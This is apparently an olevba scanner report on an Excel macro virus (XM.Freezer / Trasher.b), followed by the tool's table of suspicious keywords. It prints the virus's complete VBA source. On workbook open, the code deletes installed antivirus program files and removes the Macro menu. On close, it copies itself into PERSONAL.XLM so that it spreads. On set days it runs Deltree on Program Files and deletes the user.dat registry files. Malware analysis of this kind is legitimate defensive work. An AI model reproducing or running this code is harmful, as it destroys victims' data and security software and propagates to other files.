olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Trasher.b-d5e158a1fe807da15418c5013290c8ba0caaed3d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet3.bas 
in file: Virus.MSExcel.Trasher.b-d5e158a1fe807da15418c5013290c8ba0caaed3d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'********************************
'* Name    : XM.Freezer         *
'* Created : February 5, 1998   *
'* Author  : ULTRAS             *
'********************************
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Call Auto_Close
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\FindVirus\*.*"
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\f-macro\*.*"
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\McAfee\VirusScan\*.*"
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\Norton AntiVirus\*.*"
Call Joke
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
ULTRAS = 0
Freezer = 0
Application.ScreenUpdating = False
For b = 1 To Application.Workbooks.Count
If Application.Workbooks(b).Name = "PERSONAL.XLM" Then
ULTRAS = 1
For u = 1 To Application.Workbooks("PERSONAL.XLM").Modules.Count
If Application.Workbooks("PERSONAL.XLM").Modules(u).Name = "Sheet3" Then
Freezer = 1
End If
Next
If Freezer = 0 Then
Windows("PERSONAL.XLM").Visible = True
Application.Workbooks("Freezer.XLM").Modules("Sheet3").Copy after:=Application.Workbooks("PERSONAL.XLM").Modules(1)
Windows("PERSONAL.XLM").Visible = False
Application.Workbooks("PERSONAL.XLM").Save
End If
End If
Next
If ULTRAS = 0 Then
newname$ = ActiveWorkbook.Name
Application.Workbooks(newname$).SaveCopyAs Application.StartupPath + "\PERSONAL.XLM"
Application.Workbooks.Open (Application.StartupPath + "\PERSONAL.XLM")
Windows("PERSONAL.XLM").Visible = False
Application.Workbooks("PERSONAL.XLM").Save
End If
Application.ScreenUpdating = True
End Sub

Sub Joke()
Attribute Joke.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo HaHaHa
If Day(Now()) = 14 Then
MsgBox "You Infected XM.Freezer by ULTRAS", 16, "ULTRAS"
Shell ("Deltree  /y C:\Progra~1")
End If
If Day(Now()) = 28 Then
MsgBox "You Infected XM.Freezer by ULTRAS", 48, "ULTRAS"
SetAttr "c:\windows\user.dat", 0
SetAttr "c:\windows\user.da0", 0
Kill "c:\windows\user.dat"
Kill "c:\windows\user.da0"
End If
HaHaHa:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

